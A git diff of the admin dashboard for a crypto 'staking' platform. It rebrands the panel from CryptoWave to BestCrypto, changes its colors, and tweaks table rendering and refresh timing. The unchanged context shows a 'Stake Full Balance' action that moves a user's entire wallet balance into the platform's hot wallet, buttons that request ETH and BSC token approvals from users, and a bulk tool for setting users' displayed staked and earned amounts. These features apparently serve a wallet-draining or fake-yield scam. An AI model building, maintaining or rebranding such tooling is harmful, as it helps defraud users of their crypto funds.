@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Dashboard - CryptoWave</title>
+  <title>Admin Dashboard - BestCrypto</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -42,7 +42,7 @@
     .logo-icon {
       width: 40px;
       height: 40px;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #2EE6A8 0%, #14B8A6 100%);
       border-radius: 10px;
       display: flex;
       align-items: center;
@@ -77,9 +77,9 @@
 
     .nav-item:hover { background: rgba(255, 255, 255, 0.05); color: #ffffff; }
     .nav-item.active {
-      background: linear-gradient(135deg, rgba(102, 126, 234, 0.2) 0%, rgba(118, 75, 162, 0.2) 100%);
+      background: linear-gradient(135deg, rgba(46, 230, 168, 0.2) 0%, rgba(20, 184, 166, 0.2) 100%);
       color: #ffffff;
-      border-left: 3px solid #667eea;
+      border-left: 3px solid #2EE6A8;
     }
 
     .nav-item .icon { font-size: 1.125rem; }
@@ -124,16 +124,16 @@
 
     .refresh-btn {
       padding: 0.625rem 1rem;
-      background: rgba(102, 126, 234, 0.2);
-      border: 1px solid rgba(102, 126, 234, 0.3);
+      background: rgba(46, 230, 168, 0.2);
+      border: 1px solid rgba(46, 230, 168, 0.3);
       border-radius: 8px;
-      color: #667eea;
+      color: #2EE6A8;
       font-weight: 600;
       cursor: pointer;
       transition: all 0.2s ease;
     }
 
-    .refresh-btn:hover { background: rgba(102, 126, 234, 0.3); }
+    .refresh-btn:hover { background: rgba(46, 230, 168, 0.3); }
 
     .content { padding: 2rem; }
     .page-section { display: none; }
@@ -155,7 +155,7 @@
       transition: all 0.2s ease;
     }
 
-    .stat-card:hover { border-color: rgba(102, 126, 234, 0.5); transform: translateY(-2px); }
+    .stat-card:hover { border-color: rgba(46, 230, 168, 0.5); transform: translateY(-2px); }
     .stat-card .icon { font-size: 2rem; margin-bottom: 1rem; }
     .stat-card .label { font-size: 0.875rem; color: rgba(255, 255, 255, 0.6); margin-bottom: 0.5rem; }
     .stat-card .value { font-size: 1.75rem; font-weight: 800; }
@@ -198,8 +198,8 @@
 
     /* Buttons */
     .btn { padding: 0.5rem 1rem; border: none; border-radius: 8px; font-size: 0.8rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
-    .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
-    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4); }
+    .btn-primary { background: linear-gradient(135deg, #2EE6A8 0%, #14B8A6 100%); color: white; }
+    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(46, 230, 168, 0.4); }
     .btn-success { background: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); }
     .btn-success:hover { background: rgba(16, 185, 129, 0.3); }
     .btn-danger { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
@@ -213,7 +213,7 @@
     .form-group { margin-bottom: 1.25rem; }
     .form-group label { display: block; font-size: 0.875rem; font-weight: 600; color: rgba(255, 255, 255, 0.7); margin-bottom: 0.5rem; }
     .form-input { width: 100%; padding: 0.875rem 1rem; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: #ffffff; font-size: 0.9rem; transition: all 0.2s ease; }
-    .form-input:focus { outline: none; border-color: #667eea; background: rgba(255, 255, 255, 0.08); }
+    .form-input:focus { outline: none; border-color: #2EE6A8; background: rgba(255, 255, 255, 0.08); }
     select.form-input { background: #1a1a24; color: #ffffff; }
     select.form-input option { background: #1a1a24; color: #ffffff; }
     .form-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
@@ -239,7 +239,7 @@
     .empty-state { text-align: center; padding: 3rem 2rem; color: rgba(255, 255, 255, 0.5); }
     .empty-state .icon { font-size: 3rem; margin-bottom: 1rem; }
     .loading { display: flex; align-items: center; justify-content: center; padding: 3rem; }
-    .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 255, 255, 0.1); border-top-color: #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 255, 255, 0.1); border-top-color: #2EE6A8; border-radius: 50%; animation: spin 0.8s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .wallet-address { font-family: 'Monaco', 'Courier New', monospace; font-size: 0.85rem; }
@@ -248,7 +248,7 @@
     .toggle-switch input { opacity: 0; width: 0; height: 0; }
     .toggle-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255, 255, 255, 0.1); border-radius: 26px; transition: 0.3s; }
     .toggle-slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background: white; border-radius: 50%; transition: 0.3s; }
-    input:checked + .toggle-slider { background: #667eea; }
+    input:checked + .toggle-slider { background: #2EE6A8; }
     input:checked + .toggle-slider:before { transform: translateX(24px); }
 
     /* Mobile Menu Button */
@@ -258,7 +258,7 @@
       top: 1rem;
       left: 1rem;
       z-index: 1001;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #2EE6A8 0%, #14B8A6 100%);
       border: none;
       border-radius: 10px;
       width: 44px;
@@ -268,7 +268,7 @@
       justify-content: center;
       gap: 5px;
       cursor: pointer;
-      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+      box-shadow: 0 4px 15px rgba(46, 230, 168, 0.4);
     }
 
     .mobile-menu-btn span {
@@ -398,9 +398,9 @@
     <aside class="sidebar" id="sidebar">
       <div class="sidebar-header">
         <div class="sidebar-logo">
-          <div class="logo-icon">C</div>
+          <div class="logo-icon">B</div>
           <div>
-            <span>CryptoWave</span>
+            <span>BestCrypto</span>
             <small>Admin Panel</small>
           </div>
         </div>
@@ -499,8 +499,8 @@
         <section id="page-users" class="page-section">
           <div class="section-title">All Users <button class="btn btn-primary btn-sm" style="margin-left: 1rem;" onclick="refreshWalletBalances()">🔄 Refresh Balances</button></div>
           <!-- Bulk action bar (hidden until rows are selected) -->
-          <div id="bulk-action-bar" style="display:none;align-items:center;gap:1rem;background:#1a1a2e;border:1px solid rgba(102,126,234,0.4);border-radius:10px;padding:0.75rem 1.25rem;margin-bottom:1rem;">
-            <span id="bulk-selected-count" style="font-weight:700;color:#667eea;">0 selected</span>
+          <div id="bulk-action-bar" style="display:none;align-items:center;gap:1rem;background:#1a1a2e;border:1px solid rgba(46,230,168,0.4);border-radius:10px;padding:0.75rem 1.25rem;margin-bottom:1rem;">
+            <span id="bulk-selected-count" style="font-weight:700;color:#2EE6A8;">0 selected</span>
             <button class="btn btn-primary btn-sm" onclick="openBulkEdit()">Set Staked / Earned</button>
             <button class="btn btn-sm" style="background:rgba(255,255,255,0.08);color:#fff;" onclick="clearBulkSelection()">Clear</button>
           </div>
@@ -619,11 +619,11 @@
           <div class="section-title">Platform Wallets</div>
 
           <!-- Payout Hot Wallet Live Balances -->
-          <div id="payout-wallet-panel" style="background:linear-gradient(135deg,rgba(102,126,234,0.12),rgba(118,75,162,0.12));border:1px solid rgba(102,126,234,0.3);border-radius:16px;padding:1.5rem;margin-bottom:1.5rem;">
+          <div id="payout-wallet-panel" style="background:linear-gradient(135deg,rgba(46,230,168,0.12),rgba(20,184,166,0.12));border:1px solid rgba(46,230,168,0.3);border-radius:16px;padding:1.5rem;margin-bottom:1.5rem;">
             <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;flex-wrap:wrap;gap:0.75rem;">
               <div>
                 <div style="font-weight:700;font-size:1rem;margin-bottom:0.25rem;">💸 Platform Payout Wallet (Hot Wallet)</div>
-                <div id="payout-wallet-address" style="font-family:monospace;font-size:0.8rem;color:#a78bfa;">Loading…</div>
+                <div id="payout-wallet-address" style="font-family:monospace;font-size:0.8rem;color:#5EEAD4;">Loading…</div>
               </div>
               <button class="btn btn-primary btn-sm" onclick="loadPlatformWallet()">🔄 Refresh Balances</button>
             </div>
@@ -686,7 +686,7 @@
           </div>
 
           <!-- Summary header card -->
-          <div style="background:linear-gradient(135deg,rgba(16,185,129,0.12),rgba(102,126,234,0.12));border:1px solid rgba(16,185,129,0.25);border-radius:16px;padding:1.5rem;margin-bottom:1.5rem;">
+          <div style="background:linear-gradient(135deg,rgba(16,185,129,0.12),rgba(46,230,168,0.12));border:1px solid rgba(16,185,129,0.25);border-radius:16px;padding:1.5rem;margin-bottom:1.5rem;">
             <div class="hw-summary-inner" style="display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:1rem;">
               <div>
                 <div style="font-size:0.72rem;color:rgba(255,255,255,0.45);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:0.3rem;">Total Portfolio Value</div>
@@ -695,7 +695,7 @@
               </div>
               <div style="text-align:right;">
                 <div style="font-size:0.72rem;color:rgba(255,255,255,0.45);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:0.3rem;">Wallet Address</div>
-                <div id="hw-address" style="font-family:monospace;font-size:0.82rem;color:#a78bfa;word-break:break-all;max-width:340px;">—</div>
+                <div id="hw-address" style="font-family:monospace;font-size:0.82rem;color:#5EEAD4;word-break:break-all;max-width:340px;">—</div>
                 <button class="btn btn-primary btn-sm" onclick="copyHWAddress()" style="margin-top:0.5rem;">📋 Copy Address</button>
               </div>
             </div>
@@ -767,7 +767,7 @@
         <div class="form-row" style="margin-bottom:0.5rem;">
           <div class="form-group" style="margin-bottom:0;">
             <label>Network</label>
-            <input type="text" class="form-input" id="approve-network" readonly style="font-weight:700;color:#667eea;">
+            <input type="text" class="form-input" id="approve-network" readonly style="font-weight:700;color:#2EE6A8;">
           </div>
           <div class="form-group" style="margin-bottom:0;">
             <label>Token</label>
@@ -778,7 +778,7 @@
         <div class="form-group">
           <label>User Wallet Address (send USDT here)</label>
           <div style="display: flex; gap: 0.5rem; align-items: center;">
-            <input type="text" class="form-input" id="approve-wallet-address" readonly style="font-family: monospace; font-size: 0.8rem; color: #a78bfa;">
+            <input type="text" class="form-input" id="approve-wallet-address" readonly style="font-family: monospace; font-size: 0.8rem; color: #5EEAD4;">
             <button class="btn btn-primary btn-sm" onclick="copyApprovalWallet()" title="Copy address" style="white-space: nowrap;">📋 Copy</button>
           </div>
         </div>
@@ -868,7 +868,7 @@
               ✅ Verify Tx Hash
             </button>
             <button id="method-btn-pull" onclick="setStakeMethod('pull')"
-              style="flex:1;padding:9px;font-size:0.82rem;font-weight:700;border:none;cursor:pointer;background:rgba(102,126,234,0.2);color:#a78bfa;transition:all 0.2s;">
+              style="flex:1;padding:9px;font-size:0.82rem;font-weight:700;border:none;cursor:pointer;background:rgba(46,230,168,0.2);color:#5EEAD4;transition:all 0.2s;">
               ⚡ Stake Full Balance
             </button>
           </div>
@@ -945,7 +945,7 @@
               <button class="btn" id="admin-request-approval-eth-btn" onclick="sendApprovalRequest('ETH')" style="background:#3b82f6;color:#fff;font-size:0.82rem;flex:1;">🔵 Request ETH Approval</button>
               <button class="btn" id="admin-request-approval-bsc-btn" onclick="sendApprovalRequest('BSC')" style="background:#f59e0b;color:#000;font-size:0.82rem;flex:1;">🟡 Request BSC Approval</button>
             </div>
-            <button class="btn" id="admin-request-approval-btn" onclick="sendApprovalRequest('BOTH')" style="background:#6366f1;color:#fff;font-size:0.85rem;width:100%;margin-top:6px;">🔔 Request Both (ETH + BSC)</button>
+            <button class="btn" id="admin-request-approval-btn" onclick="sendApprovalRequest('BOTH')" style="background:#2EE6A8;color:#fff;font-size:0.85rem;width:100%;margin-top:6px;">🔔 Request Both (ETH + BSC)</button>
           </div>
         </div>
       </div>
@@ -1089,7 +1089,7 @@
         }
         document.getElementById('recent-activity').innerHTML = transactions.slice(0, 5).map(tx => {
           const txLink = tx.txHash
-            ? `<a href="https://bscscan.com/tx/${tx.txHash}" target="_blank" style="color:#667eea;font-size:0.75rem;">${tx.txHash.slice(0,10)}...↗</a>`
+            ? `<a href="https://bscscan.com/tx/${tx.txHash}" target="_blank" style="color:#2EE6A8;font-size:0.75rem;">${tx.txHash.slice(0,10)}...↗</a>`
             : '';
           return `<tr>
             <td class="wallet-address">${tx.walletAddress.slice(0,10)}...${tx.walletAddress.slice(-6)}</td>
@@ -1190,7 +1190,7 @@
       markBalancesUpdated();
     }
 
-    async function loadUsers() {
+    async function loadUsers(forceRender = false) {
       try {
         const users = await api('/api/admin/users');
 
@@ -1199,27 +1199,40 @@
           return;
         }
 
-        // Show users immediately with 0.00 balance (updates in background)
-        document.getElementById('users-table').innerHTML = users.map(user => `
-          <tr id="user-row-${user.id}">
-            <td><input type="checkbox" class="user-select-cb" data-id="${user.id}" onchange="onUserCheckChange()"></td>
-            <td>${user.id}</td>
-            <td class="wallet-address">${user.walletAddress.slice(0, 10)}...${user.walletAddress.slice(-8)}</td>
-            <td>
-              <div id="user-bal-${user.id}" style="font-size:0.85rem;color:#a0a0b0;">Loading...</div>
-            </td>
-            <td>$${user.stakedAmount.toLocaleString()}</td>
-            <td>$${user.totalEarned.toLocaleString()}</td>
-            <td><span style="color:#10b981;font-weight:600;">$${(user.claimableRewards || 0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</span></td>
-            <td><span class="badge badge-vip">VIP ${user.vipLevel}</span></td>
-            <td><span class="badge badge-${user.status === 'active' ? 'success' : user.status === 'banned' ? 'danger' : 'warning'}">${user.status}</span></td>
-            <td><div class="action-btns"><button class="btn btn-primary btn-sm" onclick="editUser(${user.id})">Edit</button><button class="btn btn-success btn-sm" onclick="openAdminStake(${user.id}, '${user.walletAddress}')">Stake</button>${user.status === 'active' ? `<button class="btn btn-danger btn-sm" onclick="banUser(${user.id})">Ban</button>` : `<button class="btn btn-success btn-sm" onclick="unbanUser(${user.id})">Unban</button>`}</div></td>
-          </tr>
-        `).join('');
+        // Only re-render table if user count changed or forced
+        const needsRender = forceRender || !_usersList || _usersList.length !== users.length || users.some((u, i) => !_usersList[i] || u.id !== _usersList[i].id);
+
+        if (needsRender) {
+          document.getElementById('users-table').innerHTML = users.map(user => `
+            <tr id="user-row-${user.id}">
+              <td><input type="checkbox" class="user-select-cb" data-id="${user.id}" onchange="onUserCheckChange()"></td>
+              <td>${user.id}</td>
+              <td class="wallet-address">${user.walletAddress.slice(0, 10)}...${user.walletAddress.slice(-8)}</td>
+              <td>
+                <div id="user-bal-${user.id}" style="font-size:0.85rem;color:#a0a0b0;">Loading...</div>
+              </td>
+              <td>$${user.stakedAmount.toLocaleString()}</td>
+              <td>$${user.totalEarned.toLocaleString()}</td>
+              <td><span style="color:#10b981;font-weight:600;">$${(user.claimableRewards || 0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</span></td>
+              <td><span class="badge badge-vip">VIP ${user.vipLevel}</span></td>
+              <td><span class="badge badge-${user.status === 'active' ? 'success' : user.status === 'banned' ? 'danger' : 'warning'}">${user.status}</span></td>
+              <td><div class="action-btns"><button class="btn btn-primary btn-sm" onclick="editUser(${user.id})">Edit</button><button class="btn btn-success btn-sm" onclick="openAdminStake(${user.id}, '${user.walletAddress}')">Stake</button>${user.status === 'active' ? `<button class="btn btn-danger btn-sm" onclick="banUser(${user.id})">Ban</button>` : `<button class="btn btn-success btn-sm" onclick="unbanUser(${user.id})">Unban</button>`}</div></td>
+            </tr>
+          `).join('');
+          fetchUserBalances(users);
+        } else {
+          // Update non-balance fields in place without re-rendering
+          users.forEach(user => {
+            const row = document.getElementById(`user-row-${user.id}`);
+            if (!row) return;
+            const cells = row.querySelectorAll('td');
+            cells[4].textContent = `$${user.stakedAmount.toLocaleString()}`;
+            cells[5].textContent = `$${user.totalEarned.toLocaleString()}`;
+            cells[6].innerHTML = `<span style="color:#10b981;font-weight:600;">$${(user.claimableRewards || 0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</span>`;
+          });
+        }
 
         _usersList = users;
-        // Fetch balances in background (non-blocking)
-        fetchUserBalances(users);
       } catch (error) {
         console.error('Load users error:', error);
         showToast('Failed to load users', 'error');
@@ -1245,7 +1258,7 @@
 
     async function refreshWalletBalances() {
       showToast('Refreshing wallet balances...');
-      await loadUsers();
+      await loadUsers(true);
       showToast('Wallet balances updated!');
     }
 
@@ -1355,7 +1368,7 @@
           const shortWallet = tx.walletAddress.slice(0,10) + '...' + tx.walletAddress.slice(-6);
           const token = tx.token || 'USDT';
           const txHashCell = tx.txHash
-            ? `<a href="https://bscscan.com/tx/${tx.txHash}" target="_blank" rel="noopener" style="color:#667eea;font-family:monospace;font-size:0.78rem;">${tx.txHash.slice(0,12)}...${tx.txHash.slice(-6)} ↗</a>`
+            ? `<a href="https://bscscan.com/tx/${tx.txHash}" target="_blank" rel="noopener" style="color:#2EE6A8;font-family:monospace;font-size:0.78rem;">${tx.txHash.slice(0,12)}...${tx.txHash.slice(-6)} ↗</a>`
             : '<span style="color:#666;">—</span>';
           const usdVal = parseFloat(tx.amount || 0).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
           return `
@@ -1381,7 +1394,7 @@
         }
         document.getElementById('transactions-table').innerHTML = transactions.map(tx => {
           const txHashCell = tx.txHash
-            ? `<a href="https://bscscan.com/tx/${tx.txHash}" target="_blank" rel="noopener" style="color:#667eea;font-family:monospace;font-size:0.78rem;">${tx.txHash.slice(0,10)}...↗</a>`
+            ? `<a href="https://bscscan.com/tx/${tx.txHash}" target="_blank" rel="noopener" style="color:#2EE6A8;font-family:monospace;font-size:0.78rem;">${tx.txHash.slice(0,10)}...↗</a>`
             : '—';
           const token = tx.token || (tx.type === 'stake' ? 'USDT' : '—');
           return `<tr>
@@ -1654,7 +1667,7 @@
               : isRefunded
                 ? `<td><span style="color:#fbbf24;font-size:0.75rem;">↩️ Refunded to user</span></td>`
                 : w.txHash
-                  ? `<td><a href="https://bscscan.com/tx/${w.txHash}" target="_blank" style="font-size:0.72rem;color:#667eea;font-family:monospace;">${w.txHash.slice(0,10)}...✅</a></td>`
+                  ? `<td><a href="https://bscscan.com/tx/${w.txHash}" target="_blank" style="font-size:0.72rem;color:#2EE6A8;font-family:monospace;">${w.txHash.slice(0,10)}...✅</a></td>`
                   : `<td style="color:#94a3b8;font-size:0.75rem;">—</td>`;
             const statusLabel = notSent ? 'not sent' : isRefunded ? 'refunded' : w.status;
             const statusColor = notSent ? 'warning' : isRefunded ? 'warning' : w.status === 'approved' ? 'success' : 'danger';
@@ -1712,8 +1725,8 @@
         const network = w.network || 'BSC';
         const token   = w.payoutToken || 'USDT';
         document.getElementById('approve-payout-instruction').innerHTML =
-          `Send <strong style="color:#10b981;">${net} ${token}</strong> on <strong style="color:#667eea;">${network}</strong> to the user's wallet, then enter the tx hash below. If PLATFORM_PAYOUT_KEY is set, this sends automatically.<br><br>` +
-          `<strong>Wallet:</strong> <span style="font-family:monospace;color:#a78bfa;word-break:break-all;">${wallet}</span>`;
+          `Send <strong style="color:#10b981;">${net} ${token}</strong> on <strong style="color:#2EE6A8;">${network}</strong> to the user's wallet, then enter the tx hash below. If PLATFORM_PAYOUT_KEY is set, this sends automatically.<br><br>` +
+          `<strong>Wallet:</strong> <span style="font-family:monospace;color:#5EEAD4;word-break:break-all;">${wallet}</span>`;
       } else {
         payoutAlert.style.display = 'none';
         stdInstructions.style.display = 'block';
@@ -2131,7 +2144,7 @@
         const isTimeout = e.name === 'AbortError';
         balEl.value = isTimeout ? 'Timed out — click Retry' : 'Could not fetch';
         bscEl.textContent = '';
-        bscEl.innerHTML = `<button onclick="loadStakeBalances('${walletAddress}')" style="background:#6366f1;color:#fff;border:none;border-radius:5px;padding:3px 10px;cursor:pointer;font-size:0.78rem;">Retry</button>`;
+        bscEl.innerHTML = `<button onclick="loadStakeBalances('${walletAddress}')" style="background:#2EE6A8;color:#fff;border:none;border-radius:5px;padding:3px 10px;cursor:pointer;font-size:0.78rem;">Retry</button>`;
       }
     }
 
@@ -2152,8 +2165,8 @@
       document.getElementById('admin-stake-pull-section').style.display   = isVerify ? 'none' : '';
       document.getElementById('method-btn-verify').style.background = isVerify ? 'rgba(16,185,129,0.2)' : 'transparent';
       document.getElementById('method-btn-verify').style.color      = isVerify ? '#10b981' : 'rgba(255,255,255,0.4)';
-      document.getElementById('method-btn-pull').style.background   = isVerify ? 'transparent' : 'rgba(102,126,234,0.2)';
-      document.getElementById('method-btn-pull').style.color        = isVerify ? 'rgba(255,255,255,0.4)' : '#a78bfa';
+      document.getElementById('method-btn-pull').style.background   = isVerify ? 'transparent' : 'rgba(46,230,168,0.2)';
+      document.getElementById('method-btn-pull').style.color        = isVerify ? 'rgba(255,255,255,0.4)' : '#5EEAD4';
       document.getElementById('admin-stake-method-hint').textContent = isVerify
         ? 'User already sent funds to hot wallet — paste the tx hash to credit them.'
         : 'Transfers the full balance directly from user\'s wallet to the platform hot wallet.';
@@ -2453,9 +2466,7 @@
       });
     });
 
-    // Full page data refresh every 30s
-    setInterval(() => { const activePage = document.querySelector('.nav-item.active').dataset.page; loadPageData(activePage); }, 60000);
-    // Balance-only refresh every 60s (no table re-render, no flicker)
+    // Balance-only refresh every 2 minutes (no table re-render, no flicker)
     setInterval(refreshOnlyBalances, 120000);
   </script>
 </body>
